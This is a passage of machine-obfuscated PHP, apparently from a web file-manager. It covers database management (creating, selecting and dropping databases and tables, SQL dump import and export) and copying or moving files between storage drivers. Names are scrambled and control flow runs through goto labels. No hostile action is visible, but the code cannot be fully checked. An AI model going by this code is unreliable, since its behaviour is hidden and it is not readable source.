$fÕ¥Ü±Œª . $EÕÛÆÌñƒ[47] . $aß­˜¦‹Ö; } if (think_config($EÕÛÆÌñƒ[944])) { $aÛø¯¡ÖÀ = $EÕÛÆÌñƒ[945] . md5(serialize($AÔÈ²‘èÊ)); $B‹ÄÓâ·ŒÁ = think_cache($aÛø¯¡ÖÀ); if ($B‹ÄÓâ·ŒÁ) { return $B‹ÄÓâ·ŒÁ; } } goto BæÍÃÙ’; BæÍÃÙ’: $Fƒ†© Œ‡ = $this->parseSql($this->selectSql, $AÔÈ²‘èÊ); $Fƒ†© Œ‡ .= $this->parseLock(isset($AÔÈ²‘èÊ[$EÕÛÆÌñƒ[764]]) ? $AÔÈ²‘èÊ[$EÕÛÆÌñƒ[764]] : !1); if (isset($aÛø¯¡ÖÀ)) { think_cache($aÛø¯¡ÖÀ, $Fƒ†© Œ‡); } goto CÒ ¿×¥øÕ; CÁé°İ¶š®: } public function parseSql($c²ùÅ–µ’, $F†‹„è…¶… = array()) { $E× ğØÒ¯Å =& $_SERVER[Ä¿Ş°¨]; $c²ùÅ–µ’ = str_replace(array($E× ğØÒ¯Å[946], $E× ğØÒ¯Å[947], $E× ğØÒ¯Å[948], $E× ğØÒ¯Å[949], $E× ğØÒ¯Å[950], $E× ğØÒ¯Å[951], $E× ğØÒ¯Å[952], $E× ğØÒ¯Å[953], $E× ğØÒ¯Å[954], $E× ğØÒ¯Å[955], $E× ğØÒ¯Å[956]), array($this->parseTable("{$F†‹„è…¶…[$E× ğØÒ¯Å[263]]}"), $this->parseDistinct(isset($F†‹„è…¶…[$E× ğØÒ¯Å[957]]) ? $F†‹„è…¶…[$E× ğØÒ¯Å[957]] : !1), $this->parseField(!empty($F†‹„è…¶…[$E× ğØÒ¯Å[257]]) ? $F†‹„è…¶…[$E× ğØÒ¯Å[257]] : $E× ğØÒ¯Å[172]), $this->parseJoin(!empty($F†‹„è…¶…[$E× ğØÒ¯Å[266]]) ? $F†‹„è…¶…[$E× ğØÒ¯Å[266]] : $E× ğØÒ¯Å[33]), $this->parseWhere(!empty($F†‹„è…¶…[$E× ğØÒ¯Å[259]]) ? $F†‹„è…¶…[$E× ğØÒ¯Å[259]] : $E× ğØÒ¯Å[33]), $this->parseGroup(!empty($F†‹„è…¶…[$E× ğØÒ¯Å[958]]) ? $F†‹„è…¶…[$E× ğØÒ¯Å[958]] : $E× ğØÒ¯Å[33]), $this->parseHaving(!empty($F†‹„è…¶…[$E× ğØÒ¯Å[959]]) ? $F†‹„è…¶…[$E× ğØÒ¯Å[959]] : $E× ğØÒ¯Å[33]), $this->parseOrder(!empty($F†‹„è…¶…[$E× ğØÒ¯Å[346]]) ? $F†‹„è…¶…[$E× ğØÒ¯Å[346]] : $E× ğØÒ¯Å[33]), $this->parseLimit(!empty($F†‹„è…¶…[$E× ğØÒ¯Å[276]]) ? $F†‹„è…¶…[$E× ğØÒ¯Å[276]] : $E× ğØÒ¯Å[33]), $this->parseUnion(!empty($F†‹„è…¶…[$E× ğØÒ¯Å[331]]) ? $F†‹„è…¶…[$E× ğØÒ¯Å[331]] : $E× ğØÒ¯Å[33]), $this->parseComment(!empty($F†‹„è…¶…[$E× ğØÒ¯Å[337]]) ? $F†‹„è…¶…[$E× ğØÒ¯Å[337]] : $E× ğØÒ¯Å[33])), $c²ùÅ–µ’); return $c²ùÅ–µ’; } public function getLastSql($E‘Œ«Ê¯šù = '') { return $E‘Œ«Ê¯šù ? $this->modelSql[$E‘Œ«Ê¯šù] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Cå‹ªãª¼É) { return addslashes($Cå‹ªãª¼É); } public function setModel($e‡ˆËÏ‹è) { $this->model = $e‡ˆËÏ‹è; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($a’šîÌİ, $cõŸ­‹åÓŸ = '') { $this->database = $a’šîÌİ; $this->type = $cõŸ­‹åÓŸ; } public function model($Aºá §³ï£ = '') { return new ModelBase($Aºá §³ï£, $_SERVER[Ä¿Ş°¨][33], $this->database); } public function db($eº·²­İ´ß = false) { goto bÏìæ‚«šÄ; F÷ÛòÁ…¯ã: $this->database = $a˜¢ï¿ØŠ‡; $BÕÜ³±è = $this->model()->db(); $B½æ©›˜ìÃ = $BÕÜ³±è->execute("\x73\x68\157\167\40\x64\x61\164\x61\x62\x61\163\145\163\40\154\151\x6b\145\x20\x27{$A§Ù›ª‚ª…}\47"); goto AµÀğØñ’; bÏìæ‚«šÄ: $c¶—ù‹ä‰µ =& $_SERVER[Ä¿Ş°¨]; $a˜¢ï¿ØŠ‡ = $this->database; if ($this->type == $c¶—ù‹ä‰µ[9] || !$eº·²­İ´ß) { return $this->model()->db(); } goto cŒ“ç´àæ’; AµÀğØñ’: if (!$B½æ©›˜ìÃ) { $BÕÜ³±è->execute("\143\x72\145\x61\164\145\40\x64\x61\x74\141\142\x61\163\x65\40\x60{$A§Ù›ª‚ª…}\140"); } $a˜¢ï¿ØŠ‡[$c¶—ù‹ä‰µ[230]] = $A§Ù›ª‚ª…; if ($a˜¢ï¿ØŠ‡[$c¶—ù‹ä‰µ[875]] == $c¶—ù‹ä‰µ[718]) { $a˜¢ï¿ØŠ‡[$c¶—ù‹ä‰µ[874]] .= $c¶—ù‹ä‰µ[960] . $A§Ù›ª‚ª…; } goto D‡„¯ŠŞö°; cŒ“ç´àæ’: $A§Ù›ª‚ª… = $a˜¢ï¿ØŠ‡[$c¶—ù‹ä‰µ[230]]; $a˜¢ï¿ØŠ‡[$c¶—ù‹ä‰µ[230]] = $c¶—ù‹ä‰µ[33]; if ($a˜¢ï¿ØŠ‡[$c¶—ù‹ä‰µ[875]] == $c¶—ù‹ä‰µ[718]) { $a¯‚Ç¥¬¬¬ = $a˜¢ï¿ØŠ‡[$c¶—ù‹ä‰µ[874]]; $a˜¢ï¿ØŠ‡[$c¶—ù‹ä‰µ[874]] = substr($a¯‚Ç¥¬¬¬, 0, strrpos($a¯‚Ç¥¬¬¬, $c¶—ù‹ä‰µ[960])); } goto F÷ÛòÁ…¯ã; D‡„¯ŠŞö°: $this->database = $a˜¢ï¿ØŠ‡; $BÕÜ³±è->execute("\x75\163\x65\40\140{$A§Ù›ª‚ª…}\x60"); return $BÕÜ³±è; goto Bæœ¦ÜŠùğ; Bæœ¦ÜŠùğ: } public function createTable($cÆèÓÊÃœË, $C—î©ñšÌ = null) { $F˜äŸŒƒç™ =& $_SERVER[Ä¿Ş°¨]; if (!IO::exist($cÆèÓÊÃœË)) { show_json(LNG($F˜äŸŒƒç™[961]), !1); } $Aå®ÓèÁ¢× = sqlSplit(IO::getContent($cÆèÓÊÃœË)); foreach ($Aå®ÓèÁ¢× as $CšÁŠ÷÷Á) { if ($C—î©ñšÌ) { $bš¬¦åä± = stripos($CšÁŠ÷÷Á, $F˜äŸŒƒç™[962]) === 0; if ($bš¬¦åä±) { $C—î©ñšÌ->task[$F˜äŸŒƒç™[963]] += 1; } } $this->model()->db()->execute($CšÁŠ÷÷Á); if ($C—î©ñšÌ && $bš¬¦åä±) { $d×‹Ïƒƒ = $F˜äŸŒƒç™[964]; preg_match($d×‹Ïƒƒ, $CšÁŠ÷÷Á, $eÙå‡ñ˜”); $C—î©ñšÌ->task[$F˜äŸŒƒç™[965]] = trim($B™Ç¿‰Ì°[0], $F˜äŸŒƒç™[811]); $C—î©ñšÌ->update(1); } } $this->taskToCache($C—î©ñšÌ); } public function insertTable($fÁŠÅ‚Œğß, $A†³Ìƒ½“­ = null) { $E£ø¤ŠÔ¾ =& $_SERVER[Ä¿Ş°¨]; foreach ($fÁŠÅ‚Œğß as $b¶æÓ‹†ê§) { $CŒ…àÅ‘ˆâ = basename($b¶æÓ‹†ê§); $CŒ…àÅ‘ˆâ = substr($CŒ…àÅ‘ˆâ, 0, strrpos($CŒ…àÅ‘ˆâ, $E£ø¤ŠÔ¾[91])); if ($A†³Ìƒ½“­) { $A†³Ìƒ½“­->task[$E£ø¤ŠÔ¾[965]] = $CŒ…àÅ‘ˆâ; } if (get_filesize($b¶æÓ‹†ê§) == 0) { continue; } $dìéàÉù¡ = $this->sqlToDb($b¶æÓ‹†ê§, $A†³Ìƒ½“­); if (!$dìéàÉù¡) { show_json(LNG($E£ø¤ŠÔ¾[966]) . "\x5b{$CŒ…àÅ‘ˆâ}\135", !1); } } $this->taskToCache($A†³Ìƒ½“­); } public function sqlFromDb($Bø’“¤È¼¨, $aÎô•›‰õ¦, $CÁ¬áìÚïÃ = null, $b‚øÖ‘æª‘ = null) { goto EË§ò­–Á; EË§ò­–Á: if ($CÁ¬áìÚïÃ) { $CÁ¬áìÚïÃ->task[$_SERVER[Ä¿Ş°¨][965]] = $Bø’“¤È¼¨; } $fíÑÊ¼å½ø = $this->model($Bø’“¤È¼¨); $c˜à­±í = 0; goto cÉÄ §©ìõ; cÉÄ §©ìõ: $EŞÚíˆÖÁ = 1; $aŒ£Íç…¡Ü = 500; $F­Ø»„â˜ = fopen($aÎô•›‰õ¦, $_SERVER[Ä¿Ş°¨][967]); goto fºìÊ¤—Å×; fºìÊ¤—Å×: $e‹ë‡±åö‰ = $fíÑÊ¼å½ø->getPk(); $BÖ¢òƒ‚Í¹ = $fíÑÊ¼å½ø->getDbFields(); do { $aÀö¹™ÂŒ = $fíÑÊ¼å½ø->field($BÖ¢òƒ‚Í¹)->order($e‹ë‡±åö‰ . $_SERVER[Ä¿Ş°¨][968])->selectPage($aŒ£Íç…¡Ü, $EŞÚíˆÖÁ); $EÈÁ¢Şô­ = !empty($aÀö¹™ÂŒ[$_SERVER[Ä¿Ş°¨][350]]) ? $aÀö¹™ÂŒ[$_SERVER[Ä¿Ş°¨][350]] : array(); if (!($bÃ¬¹‡íÈ’ = count($EÈÁ¢Şô­))) { break; } if ($CÁ¬áìÚïÃ) { $CÁ¬áìÚïÃ->task[$_SERVER[Ä¿Ş°¨][963]] += $bÃ¬¹‡íÈ’; } $dòè††Ã³¦ = array(); foreach ($EÈÁ¢Şô­ as $f¨½¢ÑšİÆ) { if ($b‚øÖ‘æª‘) { $f¨½¢ÑšİÆ[$_SERVER[Ä¿Ş°¨][75]] = "\x7b\151\x6f\x3a{$b‚øÖ‘æª‘}\x7d" . substr($f¨½¢ÑšİÆ[$_SERVER[Ä¿Ş°¨][75]], strlen("\173\151\157\x3a{$f¨½¢ÑšİÆ[$_SERVER[Ä¿Ş°¨][737]]}\x7d")); $f¨½¢ÑšİÆ[$_SERVER[Ä¿Ş°¨][737]] = $b‚øÖ‘æª‘; } $dòè††Ã³¦[] = $_SERVER[Ä¿Ş°¨][969] . $this->sqlEncode($f¨½¢ÑšİÆ) . $_SERVER[Ä¿Ş°¨][970]; } $aä¥ÚÌ•µÍ = "\111\x4e\x53\105\122\124\x20\x49\116\124\117\40\x60{$Bø’“¤È¼¨}\x60\x20\x28\x60" . implode($_SERVER[Ä¿Ş°¨][971], $BÖ¢òƒ‚Í¹) . $_SERVER[Ä¿Ş°¨][972]; fwrite($F­Ø»„â˜, $aä¥ÚÌ•µÍ . implode($_SERVER[Ä¿Ş°¨][973], $dòè††Ã³¦) . $_SERVER[Ä¿Ş°¨][67] . PHP_EOL); $EŞÚíˆÖÁ++; $c˜à­±í += $bÃ¬¹‡íÈ’; if ($CÁ¬áìÚïÃ) { $CÁ¬áìÚïÃ->update($bÃ¬¹‡íÈ’); } } while ($bÃ¬¹‡íÈ’ == $aŒ£Íç…¡Ü); goto B‹‰åŒ¥ƒ; B‹‰åŒ¥ƒ: fclose($F­Ø»„â˜); return $c˜à­±í; goto eŠå²Ú…‚; eŠå²Ú…‚: } public function sqlToDb($bÃ°ôøÒ„, $E‘Àİ×ÔøÉ = null) { goto e˜ƒµ­ˆ³; e–ë†èÜ—: if ($DÆ…“Ñ–Íù) { $DÆ…“Ñ–Íù = rtrim(trim($DÆ…“Ñ–Íù), $f‰Ù»òŒŒº[67]); if (!$eÁÑ­“ê†->execute($DÆ…“Ñ–Íù)) { return !1; } if ($E‘Àİ×ÔøÉ) { $E‘Àİ×ÔøÉ->update($EÜßÌÁÒ - 1); } } return !0; goto bƒ÷“Ç£ñÄ; e˜ƒµ­ˆ³: $f‰Ù»òŒŒº =& $_SERVER[Ä¿Ş°¨]; $eÁÑ­“ê† = $this->model()->db(); $Eº°å÷š¯æ = @fopen($bÃ°ôøÒ„, $f‰Ù»òŒŒº[974]); goto fïŒë™™È†; b¡†«Ş¤ËŠ: $Cã°Û¢Éá = 500 + 1; while (!feof($Eº°å÷š¯æ)) { if ($E‘Àİ×ÔøÉ && $EÜßÌÁÒ != 0) { $E‘Àİ×ÔøÉ->task[$f‰Ù»òŒŒº[963]] += 1; } $EÜßÌÁÒ++; $eáŠ„ÄÓñÓ = trim(fgets($Eº°å÷š¯æ)); $DÆ…“Ñ–Íù .= $f‰Ù»òŒŒº[50] . $this->sqlDecode($eáŠ„ÄÓñÓ, $this->type); if ($EÜßÌÁÒ == $Cã°Û¢Éá) { $DÆ…“Ñ–Íù = rtrim(trim($DÆ…“Ñ–Íù), $f‰Ù»òŒŒº[67]); if (!$eÁÑ­“ê†->execute($DÆ…“Ñ–Íù)) { return !1; } if ($E‘Àİ×ÔøÉ) { $E‘Àİ×ÔøÉ->update($EÜßÌÁÒ - 1); } $DÆ…“Ñ–Íù = $f‰Ù»òŒŒº[33]; $EÜßÌÁÒ = 0; } } fclose($Eº°å÷š¯æ); goto e–ë†èÜ—; fïŒë™™È†: if (!$Eº°å÷š¯æ) { return !1; } $EÜßÌÁÒ = 0; $DÆ…“Ñ–Íù = $f‰Ù»òŒŒº[33]; goto b¡†«Ş¤ËŠ; bƒ÷“Ç£ñÄ: } public function dropTable($AÆƒĞš©Ğä = null) { $cŠ™ÈÀì¸ = $this->model()->db(); $e‡ÒŞçÓßƒ = $AÆƒĞš©Ğä ? array($AÆƒĞš©Ğä) : $cŠ™ÈÀì¸->getTables(); if (!$e‡ÒŞçÓßƒ) { return; } foreach ($e‡ÒŞçÓßƒ as $AÆƒĞš©Ğä) { $cŠ™ÈÀì¸->execute("\x64\162\157\x70\40\164\141\142\154\x65\40\x69\146\40\x65\170\x69\163\164\x73\40\x60{$AÆƒĞš©Ğä}\x60"); } } private function taskToCache($C•×ç£°ã = null) { $céĞ’¨ÍÈ =& $_SERVER[Ä¿Ş°¨]; if (!$C•×ç£°ã) { return; } $D†áµ±†Ç¿ = array($céĞ’¨ÍÈ[965] => $C•×ç£°ã->task[$céĞ’¨ÍÈ[965]], $céĞ’¨ÍÈ[963] => $C•×ç£°ã->task[$céĞ’¨ÍÈ[963]], $céĞ’¨ÍÈ[975] => $C•×ç£°ã->task[$céĞ’¨ÍÈ[975]]); if ($D†áµ±†Ç¿[$céĞ’¨ÍÈ[963]] == $D†áµ±†Ç¿[$céĞ’¨ÍÈ[975]]) { $D†áµ±†Ç¿[$céĞ’¨ÍÈ[690]] = 1; } Cache::set($céĞ’¨ÍÈ[976] . $C•×ç£°ã->task[$céĞ’¨ÍÈ[372]], $D†áµ±†Ç¿); $C•×ç£°ã->end(); } private function sqlEncode($E•À´×Æ·ö) { $Bö—õÈâ¨† =& $_SERVER[Ä¿Ş°¨]; $bâ´óÚ°è‡ = array(); foreach ($E•À´×Æ·ö as $eĞñÀ³†¢) { if (is_array($eĞñÀ³†¢)) { $eĞñÀ³†¢ = json_encode_force($eĞñÀ³†¢); } $eĞñÀ³†¢ = addslashes($eĞñÀ³†¢); $eĞñÀ³†¢ = str_replace(array($Bö—õÈâ¨†[977], $Bö—õÈâ¨†[213]), array($Bö—õÈâ¨†[978], $Bö—õÈâ¨†[979]), $eĞñÀ³†¢); $bâ´óÚ°è‡[] = str_replace($Bö—õÈâ¨†[55], $Bö—õÈâ¨†[980], $eĞñÀ³†¢); } return $Bö—õÈâ¨†[55] . implode($Bö—õÈâ¨†[981], $bâ´óÚ°è‡) . $Bö—õÈâ¨†[55]; } private function sqlDecode($dÁšá¿•ÓÎ, $Aˆí‘ÒÈÂ) { $F½¿»‘—Š =& $_SERVER[Ä¿Ş°¨]; $dÁšá¿•ÓÎ = str_replace(array($F½¿»‘—Š[978], $F½¿»‘—Š[979]), array($F½¿»‘—Š[977], $F½¿»‘—Š[213]), $dÁšá¿•ÓÎ); if ($Aˆí‘ÒÈÂ == $F½¿»‘—Š[9]) { $dÁšá¿•ÓÎ = stripslashes($dÁšá¿•ÓÎ); } return $dÁšá¿•ÓÎ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($A‰¡¸­°ç›, $F¤ñ¼›ˆËâ) { $FÅ¹ˆ¬­ƒ = self::driverMake($F¤ñ¼›ˆËâ[0]); if (method_exists($FÅ¹ˆ¬­ƒ, $A‰¡¸­°ç›)) { return @call_user_func_array(array($FÅ¹ˆ¬­ƒ, $A‰¡¸­°ç›), $F¤ñ¼›ˆËâ); } if (method_exists($FÅ¹ˆ¬­ƒ, $_SERVER[Ä¿Ş°¨][982])) { return @call_user_func_array(array($FÅ¹ˆ¬­ƒ, $A‰¡¸­°ç›), $F¤ñ¼›ˆËâ); } else { if (method_exists(self, $A‰¡¸­°ç›)) { return @call_user_func_array(array(self, $A‰¡¸­°ç›), $F¤ñ¼›ˆËâ); } else { call_user_func_array(array(parent, $A‰¡¸­°ç›), $F¤ñ¼›ˆËâ); } } } public static function init($c„šˆâ°Ï¹) { return self::driverMake($c„šˆâ°Ï¹); } public static function copy($c ´ãŸç÷ô, $A½Í©ø‡Á, $eÏĞ»£à›‘ = false, $Cõ·çè–° = false) { return self::copyMove($c ´ãŸç÷ô, $A½Í©ø‡Á, $eÏĞ»£à›‘, $_SERVER[Ä¿Ş°¨][494], $Cõ·çè–°); } public static function move($B«òŠÙ—ø , $B±Ö©Óèîá, $AÂÑÜŠÕŒÀ = false, $fâç•†‡ï = false) { return self::copyMove($B«òŠÙ—ø , $B±Ö©Óèîá, $AÂÑÜŠÕŒÀ, $_SERVER[Ä¿Ş°¨][496], $fâç•†‡ï); } public static function saveFile($E•Ø›Øç†â, $e‰ÑšÒ¤, $Fƒ”ª‘‹â¢ = true) { goto dÎóù™©å‚; EÂè£…ƒëÄ: $EáÏù¸ = self::driverMake($e‰ÑšÒ¤); $fÀ–¦ª• = !1; if ($EáÏù¸->pathParse[$B‰¬æ·ù±[983]]) { $bƒ‡àó†ä› = $EáÏù¸->pathParse[$B‰¬æ·ù±[983]]; $fÀ–¦ª• = $EáÏù¸; $EáÏù¸ = self::driverMake($bƒ‡àó†ä›); } goto c¦ßÒ¥Ğ—Á; dÎóù™©å‚: $B‰¬æ·ù± =& $_SERVER[Ä¿Ş°¨]; $Dİ®ÍÜèõø = self::info($e‰ÑšÒ¤); $dõŸ±ŒÜ» = self::driverMake($E•Ø›Øç†â); goto EÂè£…ƒëÄ; c¦ßÒ¥Ğ—Á: $A»½ÏÚƒ„Ù = $EáÏù¸->pathFather($e‰ÑšÒ¤); $a²¾ß‹â°¾ = !0; if (!$Fƒ”ª‘‹â¢ && self::driverIsSame($dõŸ±ŒÜ», $EáÏù¸)) { $a²¾ß‹â°¾ = !1; } goto Cì´¨‚¬é¤; Cì´¨‚¬é¤: $fİ°¼³ó = self::copyFile($dõŸ±ŒÜ», $E•Ø›Øç†â, $EáÏù¸, $A»½ÏÚƒ„Ù, $Dİ®ÍÜèõø[$B‰¬æ·ù±[28]], $a²¾ß‹â°¾); if ($fÀ–¦ª•) { $fİ°¼³ó = $fÀ–¦ª•->getPathOuter($fİ°¼³ó); } return $fİ°¼³ó; goto eê¯ªó›Í; eê¯ªó›Í: } private static function copyMove($AÔ±­ãšÈ, $DÑ•×è–”, $B¶Ç¨Ë«„…, $F¶Ü¹§®Õ‡, $eŞæÃè…‘Ó = false) { goto a—Âëõ¸™; a¥³‚àƒ Å: $aÌ—Ñ–ˆ¸ = $F´ÆˆÍ÷ˆä->isFile($AÔ±­ãšÈ); if (!$aÌ—Ñ–ˆ¸ && $C™‡…¤ì¦Å->getType() == $a‹äÁÇº[688] && $F´ÆˆÍ÷ˆä->getType() == $a‹äÁÇº[101]) { $B¤¦×ĞÂÂ÷ = $C™‡…¤ì¦Å->copyFolderFromIO($F´ÆˆÍ÷ˆä, $AÔ±­ãšÈ, $DÑ•×è–”, $B¶Ç¨Ë«„…, $Bß±æ™¶¤, $eŞæÃè…‘Ó); } else { $B¤¦×ĞÂÂ÷ = self::copyPath($F´ÆˆÍ÷ˆä, $AÔ±­ãšÈ, $C™‡…¤ì¦Å, $DÑ•×è–”, $B¶Ç¨Ë«„…, $Bß±æ™¶¤, $aÌ—Ñ–ˆ¸, $eŞæÃè…‘Ó); } if ($B¤¦×ĞÂÂ÷ && $Bß±æ™¶¤) { $F´ÆˆÍ÷ˆä->remove($AÔ±­ãšÈ); } goto F£±¨õáù; cˆ¾”’³ï–: $e³¤êìÂ = !1; if ($C™‡…¤ì¦Å->pathParse[$a‹äÁÇº[983]]) { $DÑ•×è–” = $C™‡…¤ì¦Å->pathParse[$a‹äÁÇº[983]]; $e³¤êìÂ = $C™‡…¤ì¦Å; $C™‡…¤ì¦Å = self::driverMake($DÑ•×è–”); } self::check($F´ÆˆÍ÷ˆä, $AÔ±­ãšÈ, $C™‡…¤ì¦Å, $DÑ•×è–”); goto b³´ë‹±³Ú; b…Ïî¹Šƒ: $F´ÆˆÍ÷ˆä = self::driverMake($AÔ±­ãšÈ); $C™‡…¤ì¦Å = self::driverMake($DÑ•×è–”); $Bß±æ™¶¤ = $F¶Ü¹§®Õ‡ == $a‹äÁÇº[496]; goto cˆ¾”’³ï–; b³´ë‹±³Ú: Hook::trigger($a‹äÁÇº[72], $F´ÆˆÍ÷ˆä, $AÔ±­ãšÈ, $C™‡…¤ì¦Å, $DÑ•×è–”); $a“ƒÚ˜°ßø = self::driverIsSame($F´ÆˆÍ÷ˆä, $C™‡…¤ì¦Å); if ($a“ƒÚ˜°ßø) { if ($F¶Ü¹§®Õ‡ == $a‹äÁÇº[496] && trim($DÑ•×è–”, $a‹äÁÇº[8]) == trim($C™‡…¤ì¦Å->pathFather($AÔ±­ãšÈ), $a‹äÁÇº[8])) { return $C™‡…¤ì¦Å->getPathOuter($AÔ±­ãšÈ); } if (method_exists($C™‡…¤ì¦Å, $F¶Ü¹§®Õ‡)) { return $C™‡…¤ì¦Å->{$F¶Ü¹§®Õ‡}($AÔ±­ãšÈ, $DÑ•×è–”, $B¶Ç¨Ë«„…); } } goto a¥³‚àƒ Å; a—Âëõ¸™: $a‹äÁÇº =& $_SERVER[Ä¿Ş°¨]; if (!$AÔ±­ãšÈ || $AÔ±­ãšÈ == $a‹äÁÇº[8] || !$DÑ•×è–”) { return !1; } ignore_timeout(); goto b…Ïî¹Šƒ; F£±¨õáù: if ($e³¤êìÂ) { $B¤¦×ĞÂÂ÷ = $e³¤êìÂ->getPathOuter($B¤¦×ĞÂÂ÷); } return $B¤¦×ĞÂÂ÷; goto e¦ÒÆÑ„ëÛ; e¦ÒÆÑ„ëÛ: } private static function check($eå¢Ó°Ù¥, $döõ²Ï„‚, $eê¶ßô×Ø, &$Eî¤š¡õš) { $e£ÓŒµõ§¢ =& $_SERVER[Ä¿Ş°¨]; if (self::driverIsSame($eå¢Ó°Ù¥, $eê¶ßô×Ø) && $eå¢Ó°Ù¥->isFolder($döõ²Ï„‚) && $eå¢Ó°Ù¥->isParentOf($döõ²Ï„‚, $Eî¤š¡õš)) { show_json(LNG($e£ÓŒµõ§¢[984]), !1); } if (!$eå¢Ó°Ù¥->exist($döõ²Ï„‚)) { show_json(LNG($e£ÓŒµõ§¢[100]), !1); } } private static function copyPath($E¹â¤¸•©Ù, $Aæ¥ÎñĞÕ¶, $fñÃ¿×¤÷, $cØ¿¢Éİ®‰, $FÒŸöÑˆÉ, $D¡¶ùŠ¾—ä, $BËãÙ¥ ƒ, $CÃŒµ–åªà = false) { goto D‰ùôİî•ë; F£—ºî½İ: $bí•ÎÅØê = $fñÃ¿×¤÷->mkdir($fñÃ¿×¤÷->getPath($d¯÷ùÏÈ¡)); $cØ¿¢Éİ®‰ = $fñÃ¿×¤÷->getPathInner($bí•ÎÅØê); $eóñ…‰ÊËï = $E¹â¤¸•©Ù->listPath($Aæ¥ÎñĞÕ¶, !0); goto cè™Æã; D‰ùôİî•ë: $D¸õ‘êÉæ… =& $_SERVER[Ä¿Ş°¨]; $Còôİ’·Ä = $CÃŒµ–åªà ? $CÃŒµ–åªà : $E¹â¤¸•©Ù->getPathName($E¹â¤¸•©Ù->pathThis($Aæ¥ÎñĞÕ¶)); if ($FÒŸöÑˆÉ) { $E¬äñšÙéñ = $fñÃ¿×¤÷->fileNameExist($cØ¿¢Éİ®‰, $Còôİ’·Ä); $Còôİ’·Ä = $fñÃ¿×¤÷->fileNameAuto($cØ¿¢Éİ®‰, $Còôİ’·Ä, $FÒŸöÑˆÉ, !$BËãÙ¥ ƒ); $FÒŸöÑˆÉ = $E¬äñšÙéñ ? $FÒŸöÑˆÉ : !1; } goto cÆÈŸ›ãœ; cÆÈŸ›ãœ: if ($BËãÙ¥ ƒ) { return self::copyFile($E¹â¤¸•©Ù, $Aæ¥ÎñĞÕ¶, $fñÃ¿×¤÷, $cØ¿¢Éİ®‰, $Còôİ’·Ä, $D¡¶ùŠ¾—ä); } if ($FÒŸöÑˆÉ == REPEAT_RENAME_FOLDER) { $FÒŸöÑˆÉ = !1; } $d¯÷ùÏÈ¡ = rtrim($cØ¿¢Éİ®‰, $D¸õ‘êÉæ…[8]) . $D¸õ‘êÉæ…[8] . $Còôİ’·Ä; goto F£—ºî½İ; cè™Æã: $BÓÀÄ…¢Š¡ = array_merge($eóñ…‰ÊËï[$D¸õ‘êÉæ…[73]], $eóñ…‰ÊËï[$D¸õ‘êÉæ…[74]]); foreach ($BÓÀÄ…¢Š¡ as $CÉˆˆİ‰) { $A¤Îï¤¨…Ğ = $CÉˆˆİ‰[$D¸õ‘êÉæ…[29]] == $D¸õ‘êÉæ…[163]; $Aæ¥ÎñĞÕ¶ = $E¹â¤¸•©Ù->getPathInner($CÉˆˆİ‰[$D¸õ‘êÉæ…[75]]); $Cæùê»Ïèí = self::copyPath($E¹â¤¸•©Ù, $Aæ¥ÎñĞÕ¶, $fñÃ¿×¤÷, $cØ¿¢Éİ®‰, $FÒŸöÑˆÉ, $D¡¶ùŠ¾—ä, $A¤Îï¤¨…Ğ); if (!$Cæùê»Ïèí) { write_log($D¸õ‘êÉæ…[985] . $Aæ¥ÎñĞÕ¶ . $D¸õ‘êÉæ…[986] . $cØ¿¢Éİ®‰, $D¸õ‘êÉæ…[987]); } } return $bí•ÎÅØê; goto F©µÉ•¯¡; F©µÉ•¯¡: } private static function copyFile($aòèê‘¼, $c˜ñ¥’Ø¿İ, $dŠğæìÂÊ, $cšã…‘«, $C®âóîĞË, $f„¥Ë‘´ª’) { goto EÏ”ÇÓò‹°; EÏ”ÇÓò‹°: $CÙ÷®ÄòèŠ =& $_SERVER[Ä¿Ş°¨]; $cšã…‘« = $dŠğæìÂÊ->getPath(rtrim($cšã…‘«, $CÙ÷®ÄòèŠ[8]) . $CÙ÷®ÄòèŠ[8] . $C®âóîĞË); $Bß…ù¥ñÂ = $CÙ÷®ÄòèŠ[988] . time() . rand_string(5); goto BŞÎî­°™; bçÓ”›äï—: $C„µ¹ôêò× = $aòèê‘¼->iconvApp($C„µ¹ôêò×); $FË¦î…ôê = $dŠğæìÂÊ->upload($cšã…‘«, $C„µ¹ôêò×, $f„¥Ë‘´ª’); self::remove($fÉâ é¤º . $Bß…ù¥ñÂ); goto b¯Ã² ùó£; cÕÅ©—£›ç: mk_dir($fÉâ é¤º); $C„µ¹ôêò× = $fÉâ é¤º . $Bß…ù¥ñÂ; $C„µ¹ôêò× = $aòèê‘¼->download($c˜ñ¥’Ø¿İ, $C„µ¹ôêò×); goto bçÓ”›äï—; b¯Ã² ùó£: Hook::trigger($CÙ÷®ÄòèŠ[990], $aòèê‘¼, $c˜ñ¥’Ø¿İ, $dŠğæìÂÊ, $cšã…‘«, $C®âóîĞË, $FË¦î…ôê); return $FË¦î…ôê; goto d‹õÚõÑˆË; BŞÎî­°™: Hook::trigger($CÙ÷®ÄòèŠ[989], $aòèê‘¼, $c˜ñ¥’Ø¿İ, $dŠğæìÂÊ, $cšã…‘«, $C®âóîĞË, $Bß…ù¥ñÂ); if (self::driverIsSame($aòèê‘¼, $dŠğæìÂÊ)) { if ($f„¥Ë‘´ª’) { $FË¦î…ôê = $dŠğæìÂÊ->moveFile($c˜ñ¥’Ø¿İ, $cšã…‘«); } else { $FË¦î…ôê = $dŠğæìÂÊ->copyFile($c˜ñ¥’Ø¿İ, $cšã…‘«); } Hook::trigger($CÙ÷®ÄòèŠ[990], $aòèê‘¼, $c˜ñ¥’Ø¿İ, $dŠğæìÂÊ, $cšã…‘«, $C®âóîĞË, $FË¦î…ôê); return $FË¦î…ôê; } $fÉâ é¤º = TEMP_FILES; goto cÕÅ©—£›ç; d‹õÚõÑˆË: } public static function pathFather($c‡…ÖÆÆË§) { $AæÅÔí’¿Á = IO::init($c‡…ÖÆÆË§); $f¼Î†¾Šã‘ = $AæÅÔí’¿Á->pathFather($AæÅÔí’¿Á->path); return $AæÅÔí’¿Á->getPathOuter($f¼Î†¾Šã‘); } public static function fileOut($D¹á‹ˆ÷Ş, $båÏƒĞĞãò = false, $Bˆ‹íÀŒ¯Û = false, $FÙè‡®æÑ = '') { $aÔ¨ªĞÒêÚ = self::driverMake($D¹á‹ˆ÷Ş); if ($aÔ¨ªĞÒêÚ->isFileOutServer()) { return 